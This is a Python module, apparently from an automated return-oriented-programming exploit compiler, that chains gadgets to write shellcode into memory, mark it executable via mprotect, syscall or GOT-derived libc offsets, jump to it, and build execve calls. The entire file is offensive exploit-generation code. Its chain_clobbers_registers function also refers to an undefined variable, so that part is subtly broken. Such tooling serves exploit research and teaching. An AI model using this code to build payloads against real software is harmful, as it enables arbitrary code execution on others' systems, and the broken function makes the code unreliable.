# This file contains the logic to combine a set of gadgets and implement the desired goals
import struct, logging, collections
import archinfo
import goal as go, gadget as ga, utils, extra_archinfo

PAGE_MASK = 0xfffffffffffff000
PROT_RWX = 7

class Scheduler(object):
  """This class takes a set of gadgets and combines them together to implement the given goals"""

  def __init__(self, gadget_list, goal_resolver, file_handler, arch, level = logging.WARNING, bad_bytes = None):
    logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
    self.logger = logging.getLogger(self.__class__.__name__)
    self.logger.setLevel(level)

    self.arch = arch
    self.bad_bytes = bad_bytes
    self.gadget_list = gadget_list
    self.file_handler = file_handler

    self.write_memory_chains = None
    self.store_mem_gadgets = collections.defaultdict(dict)
    self.alignment = self.arch.bits / 8

    self.chain = None
    self.goals = goal_resolver.get_goals()
    self.writable_memory = self.file_handler.get_writable_memory()

    self.sp = self.arch.registers['sp'][0]

  def get_writable_memory(self, number_of_bytes):
    address = self.writable_memory
    # Align the number of bytes and then Leave a little room between memory usages
    self.writable_memory += number_of_bytes + (self.alignment - (number_of_bytes % self.alignment)) + self.alignment
    return address

  def get_all_registers(self):
    registers = dict(self.arch.registers)
    for reg in extra_archinfo.IGNORED_REGISTERS[self.arch.name]:
      registers.pop(reg, None)
    reg_numbers = []
    for name, (number, size) in registers.items():
      if number not in reg_numbers and number not in [self.sp, self.arch.registers['ip'][0]]:
        reg_numbers.append(number)
    return reg_numbers

  def reg_name(self, reg_number):
    return self.arch.translate_register_name(reg_number)

  def reg_number(self, reg_name):
    return self.arch.registers[reg_name][0]

  def get_chain(self):
    """Returns the compiled ROP chain"""
    if self.chain == None:
      self.chain = self.chain_gadgets()
    return self.chain

  def print_gadgets(self, caption, gadgets):
    self.logger.debug(caption)
    for gadget in gadgets:
      self.logger.debug(str(gadget))

  def find_store_mem_gadgets(self, addr_reg, value_reg):
    """This method finds a gadget that writes the value in one register to the address in another"""
    if value_reg in self.store_mem_gadgets[addr_reg]:
      return self.store_mem_gadgets[addr_reg][value_reg]

    best = None
    for gadget in self.gadget_list.foreach_type(ga.StoreMem):
      if (addr_reg == gadget.inputs[0]
        and value_reg == gadget.inputs[1]
        and (best == None or best.complexity() > gadget.complexity())): # and it's got a better complexity than the current one
          best = gadget

    self.store_mem_gadgets[addr_reg][value_reg] = best
    if best != None:
      self.logger.debug("Found StoreMem(%s, %s) Gadget:%s", self.reg_name(addr_reg), self.reg_name(value_reg), best)
    return best

  def combined_complexity(self, chain):
    """This method determines the complexity of a gadget chain by summing the complexity of the individual gadgets in it"""
    return sum([gadget.complexity() for gadget in chain])

  def chain_clobbers_registers(self, chain, registers):
    """This method determines if any gadgets in the specified chain use any of the specified registers"""
    for gadget in chain:
      for reg in registers:
        if gadget.clobbers_registers(avoid_reg):
          return True
    return False

  def find_write_memory_gadgets(self):
    """This method determines a set of gadget sequences that will write a value to memory"""

    self.write_memory_chains = []
    for addr_reg in self.get_all_registers():
      # First find a gadget to set the address register
      load_addr_gadget = self.gadget_list.find_load_stack_gadget(addr_reg)
      if load_addr_gadget == None:
        continue

      for value_reg in self.get_all_registers():
        if addr_reg == value_reg:
          continue

        # Then find a gadget to set the value register
        load_value_gadget = self.gadget_list.find_load_stack_gadget(value_reg, [addr_reg])
        if load_value_gadget == None:
          continue

        # Finally find a gadget to set the memory at the address register to the value in the value register
        store_mem_gadget = self.find_store_mem_gadgets(addr_reg, value_reg)
        if store_mem_gadget != None:
          chain = [load_addr_gadget, load_value_gadget, store_mem_gadget]
          complexity = self.combined_complexity(chain)
          self.write_memory_chains.append((chain, complexity))

  def get_write_memory_gadget(self, avoid_registers = None):
    """This method iterates over write_memory_chains and finds the best gadget chain to write memory with, while excluding any
      specified registers"""
    if self.write_memory_chains == None:
      self.find_write_memory_gadgets()

    best = best_complexity = None
    for (chain, complexity) in self.write_memory_chains:
      if best_complexity == None or best_complexity > complexity:
        if avoid_registers == None or not self.chain_clobbers_registers(chain, avoid_registers):
          best_complexity = complexity
          best = chain

    if best == None:
      raise RuntimeError("Could not find a way to write to memory")
    return best

  def split_arguments(self, arguments, end_address):
    """Splits the arguments into the register ones and the stack based ones.  This method will return a dictionary mapping
      registers to values for the register based arguments, and a list of stack based arguments"""
    # Split the arguments into stack and register based ones
    num_reg_args = len(extra_archinfo.func_calling_convention[self.arch.name])
    reg_arguments = arguments[:num_reg_args]
    stack_arguments = arguments[num_reg_args:]

    # Create the registers to values dictionary
    register_values = {}
    for i in range(len(reg_arguments)):
      reg = self.reg_number(extra_archinfo.func_calling_convention[self.arch.name][i])
      register_values[reg] = reg_arguments[i]
    if 'lr' in self.arch.registers and end_address != None:
      register_values[self.reg_number('lr')] = end_address

    return register_values, stack_arguments

  def create_function_chain(self, goal, end_address = None):
    """This method returns a ROP chain that will call a function"""
    self.logger.info("Creating function chain for %s(%s) and finishing with a return to %s", goal.name,
      ",".join([hex(x) if type(x)!=str else x for x in goal.arguments]), hex(end_address) if end_address != None else end_address)

    # Holds the ROP chain generated throughout the function
    chain = ""

    # Resolve any string arguments to where we're going to write those arguments too
    argument_strings = {}
    for i in range(len(goal.arguments)):
      arg = goal.arguments[i]
      if type(arg) == str:
        # TODO search the loaded memory for a string in case we're lucky and it already exists in memory
        address = self.get_writable_memory(len(arg))
        argument_strings[arg] = address
        goal.arguments[i] = address

    # Split the arguments into a register and stack arguments
    register_values, stack_arguments = self.split_arguments(goal.arguments, end_address)

    # Get a chain to set all the registers
    first_address = goal.address
    if len(register_values) != 0:
      chain, first_address = self.gadget_list.create_load_registers_chain(goal.address, self.sp, register_values)
      if chain == None:
        return None, None

    # Add the function's address (and the LR gadget to set the gadget after this function if this architecture requires it)
    if 'lr' not in self.arch.registers and end_address != None:
      chain += utils.ap(end_address, self.arch)

    # Add the stack arguments
    for arg in stack_arguments:
      chain += utils.ap(arg, self.arch)

    # Write any string arguments to memory
    for arg, address in argument_strings.items():
      arg_chain, first_address = self.create_write_memory_chain(arg, address, first_address, "\x00")
      chain = arg_chain + chain

    return (chain, first_address)

  def create_read_add_jmp_function_chain(self, address, offset, arguments, end_address):
    """This method creates a ROP chain that will read from a specified address, apply an offset, and then call that address with
      a set of provided arguments"""

    jump_gadget = arg_chain = arg_chain_address = None
    stack_arguments = []

    # First, look for all the needed gadgets
    original_offset = offset
    for jump_reg in self.get_all_registers():
      read_gadget = set_read_addr_gadget = None
      for addr_reg in self.get_all_registers():
        if addr_reg == jump_reg: continue

        # Find a gadget to read from memory
        read_gadget = self.gadget_list.find_gadget(ga.LoadMem, [addr_reg], [jump_reg])
        if read_gadget == None:
          continue

        # Then find a gadget that will let you set the address register for that read
        set_read_addr_gadget = self.gadget_list.find_load_stack_gadget(read_gadget.inputs[0], [jump_reg])
        if set_read_addr_gadget == None:
          continue
        break

      if set_read_addr_gadget == None or read_gadget == None:
        continue

      # Then find a gadget that will let you jump to that register
      jump_gadget = self.gadget_list.find_gadget(ga.Jump, [jump_reg])
      if jump_gadget == None:
        continue

      add_jump_reg_gadget = set_add_reg_gadget = None
      for add_reg in self.get_all_registers():
        offset = original_offset
        if add_reg == jump_reg: continue

        # Then find a gadget that will let you add to that register
        add_jump_reg_gadget = self.gadget_list.find_gadget(ga.AddGadget, [jump_reg, add_reg], [jump_reg])
        if add_jump_reg_gadget == None: # If we can't find an AddGadget, try finding a SubGadget and negating
          add_jump_reg_gadget = self.gadget_list.find_gadget(ga.SubGadget, [jump_reg, add_reg], [jump_reg])
          offset = -offset
          if add_jump_reg_gadget == None:
            continue

        # Next, find a gadget that will let you set what you're adding to that register
        set_add_reg_gadget = self.gadget_list.find_load_stack_gadget(add_reg, [jump_reg])
        if set_add_reg_gadget == None:
          continue
        break

      if add_jump_reg_gadget == None:
        continue

      # Split the arguments into a register and stack arguments
      register_values, stack_arguments = self.split_arguments(arguments, end_address)

      # Create a chain to set all the registers, while avoiding clobbering our jump register
      if len(register_values) != 0:
        arg_chain, arg_chain_address = self.gadget_list.create_load_registers_chain(jump_gadget.address, self.sp, register_values, [jump_reg])
      else:
        arg_chain, arg_chain_address = "", jump_gadget.address

      if arg_chain != None:
        break

    # Couldn't find all the necessary gadgets
    if arg_chain == None:
      return (None, None)

    self.print_gadgets("Found all necessary gadgets for reading the GOT and " +
      "calling a different function with 0x{:x} bytes argument gadgets:".format(len(arg_chain)),
      [set_read_addr_gadget, read_gadget, set_add_reg_gadget, add_jump_reg_gadget, jump_gadget])

    # Build the chain
    chain = set_read_addr_gadget.chain(read_gadget.address, [address - read_gadget.params[0]]) # set the read address
    chain += read_gadget.chain(set_add_reg_gadget.address)                                     # read the address in the GOT
    chain += set_add_reg_gadget.chain(add_jump_reg_gadget.address, [offset])                   # set the offset from the base to the target
    chain += add_jump_reg_gadget.chain(arg_chain_address)                                      # add the offset
    chain += arg_chain                                                                         # set the arguments for the function

    # Add the jump to the function, and the stack based return address (if this architecture uses it)
    chain += jump_gadget.chain()
    if 'lr' not in self.arch.registers and end_address != None:
      chain += utils.ap(end_address, self.arch)

    # Last, add the stack arguments
    for arg in stack_arguments:
      chain += utils.ap(arg, self.arch)

    return (chain, set_read_addr_gadget.address)

  def create_shellcode_address_chain(self, goal):
    """This method returns a ROP chain for a ShellcodeAddressGoal.  The ROP will fix the memory permissions and then jump to the
      shellcode's address."""

    # Look for the address of functions capable of fixing the memory protections
    addresses = self.file_handler.get_symbols_address(["mprotect", "syscall"])

    if addresses["mprotect"] != None:
      # If we've have mprotect, we're on easy street.  Create a chain to call mprotect()
      self.logger.info("Found mprotect, using to change shellcode permissions")
      mprotect_goal = go.FunctionGoal("mprotect", addresses["mprotect"], [goal.shellcode_address & PAGE_MASK, 0x1000, PROT_RWX])
      return self.create_function_chain(mprotect_goal, goal.shellcode_address)
    elif addresses["syscall"] != None:
      # If we've have the syscall function, slightly harder as it needs an extra argument. Create a chain to call syscall()
      self.logger.info("Found syscall(), using it to call mprotect to change shellcode permissions")
      syscall_goal = go.FunctionGoal("syscall", addresses["syscall"], [extra_archinfo.MPROTECT_SYSCALL[self.arch.name],
        goal.shellcode_address & PAGE_MASK, 0x1000, PROT_RWX])
      return self.create_function_chain(syscall_goal, goal.shellcode_address)

    # TODO add mmap/memcpy, mmap + rop memory writing, using syscalls instead of functions, and others ways to fix the memory protections

    # We failed using the easy techniques for fixing memory, so now try to read the GOT address for a used function and then add
    # the offset in libc to find mprotect.  This will allow us to call mprotect without knowing the address of libc
    self.logger.info("Couldn't find mprotect or syscall, resorting to reading the GOT and computing addresses")
    functions_in_got = ["printf", "strlen", "puts", "read", "open", "close", "exit"] # Keep trying, in case they don't use the first function
    base_address_in_got = offset_in_libc = None
    for base in functions_in_got:
      # Find the address of the base function in libc, and the offset between it and mprotect
      base_address_in_got, offset_in_libc = self.file_handler.resolve_symbol_from_got(base, "mprotect")
      if base_address_in_got != None and offset_in_libc != None:
        self.logger.info("Using %s to find the address of libc: 0x%x", base, base_address_in_got)
        break

    if base_address_in_got != None and offset_in_libc != None:
      # Create the chain to call mprotect based on the base function's address
      mprotect_args = [goal.shellcode_address & PAGE_MASK, 0x2000, PROT_RWX]
      chain, next_address = self.create_read_add_jmp_function_chain(base_address_in_got, offset_in_libc, mprotect_args, goal.shellcode_address)
      if chain != None:
        return chain, next_address

    raise RuntimeError("Failed finding necessary gadgets for shellcode address goal")

  def create_write_regsize_memory_chain(self, buf, address, next_address):
    """This method generates a chain that will write the buffer to the given address.  Similar to ROPC we limit ourselves to one
      memory size for simplicity.  Thus, the buffer must be (arch.bits/8) bytes long"""
    if len(buf) != (self.arch.bits/8):
      raise RuntimeError("Write memory chains can only write memory in chunks of %d bytes, requested %d" % (self.arch.bits/8, len(buf)))

    # First find the necessary gagdgets
    load_addr_gadget, load_value_gadget, store_mem_gadget = self.get_write_memory_gadget()

    # Next create the chain to setup the address and value to be written
    chain = load_addr_gadget.chain(load_value_gadget.address, [address - store_mem_gadget.params[0]])
    chain += load_value_gadget.chain(store_mem_gadget.address, [buf])

    # Finally, create the chain to write to memory
    chain += store_mem_gadget.chain(next_address)

    return (chain, load_addr_gadget.address)

  def align_to_8bytes(self, buf, padding = "K"):
    if len(buf) % self.alignment != 0:
      buf += (self.alignment - (len(buf) % self.alignment)) * padding # pad it to the correct alignment (for simplicity)
    return buf

  def create_write_memory_chain(self, buf, address, next_address, padding = "K"):
    """This function returns a ROP chain implemented to write a buffer to a given address"""
    chain = ""
    addr = address
    buf = self.align_to_8bytes(buf, padding)
    for i in range(0, len(buf), self.alignment):
      # Iteratively create the ROP chain for each byte chunk of the buffer
      single_write_chain, next_address = self.create_write_regsize_memory_chain(buf[i:i+self.alignment], addr, next_address)
      chain = single_write_chain + chain
      addr += self.alignment
    return chain, next_address

  def create_shellcode_chain(self, goal):
    """This function returns a ROP chain implemented for a ShellcodeGoal.  It first writes the given shellcode to memory,
      then creates a ShellcodeAddressGoal and adds its ROP chain on."""
    shellcode_address = self.get_writable_memory(len(goal.shellcode))

    # Create a ROP chain that will fix memory permissions and jump to our shellcode
    shellcode_goal = go.ShellcodeAddressGoal(shellcode_address)
    shellcode_chain, next_address = self.create_shellcode_address_chain(shellcode_goal)

    # Create a ROP chain that will write our shellcode to memory
    chain, next_address = self.create_write_memory_chain(goal.shellcode, shellcode_address, next_address)

    # Combine the two to write our shellcode to memory and execute it
    return (chain + shellcode_chain), next_address

  def create_execve_chain(self, goal):
    """This function returns a ROP chain implemented for a ExecveGoal.  It first writes the arguments for execve, then calls
      execve"""
    argument_addresses = []
    for arg in goal.arguments:
      argument_addresses.append(self.get_writable_memory(len(arg)))
    argv_address = self.get_writable_memory(self.alignment)

    function_goal = go.FunctionGoal(goal.name, goal.address, [argument_addresses[0], argv_address, 0])
    function_chain, next_address = self.create_function_chain(function_goal, 0x4444444444444444)

    chain = ""
    for i in range(len(argument_addresses)):
      packed_args_address = utils.ap(argument_addresses[i], self.arch)
      argv_chain, next_address = self.create_write_memory_chain(packed_args_address, argv_address, next_address, "\x00")
      argv_address += len(packed_args_address)
      chain = argv_chain + chain

    null_chain, next_address = self.create_write_memory_chain("\x00", argv_address, next_address, "\x00")
    chain = null_chain + chain

    for i in range(len(goal.arguments)):
      arg_chain, next_address = self.create_write_memory_chain(goal.arguments[i], argument_addresses[i], next_address, "\x00")
      chain = arg_chain + chain

    return (chain + function_chain), next_address

  def chain_gadgets(self):
    """This function returns a ROP chain implemented for the given goals."""
    chain = ""
    next_address = 0x4444444444444444
    for i in range(len(self.goals) - 1, -1, -1):
      goal = self.goals[i]
      if type(goal) == go.FunctionGoal:
        goal_chain, next_address = self.create_function_chain(goal, next_address)
        self.logger.debug("Function call to %s's first gadget is at 0x%x", goal.name, next_address)
      elif type(goal) == go.ExecveGoal:
        goal_chain, next_address = self.create_execve_chain(goal)
      elif type(goal) == go.ShellcodeAddressGoal:
        goal_chain, next_address = self.create_shellcode_address_chain(goal)
      elif type(goal) == go.ShellcodeGoal:
        goal_chain, next_address = self.create_shellcode_chain(goal)
      else:
        raise RuntimeError("Unknown goal in scheduler.")

      if goal_chain == None:
        raise RuntimeError("Unable to create goal: {}".format(goal))

      chain = goal_chain + chain

    return utils.ap(next_address, self.arch) + chain

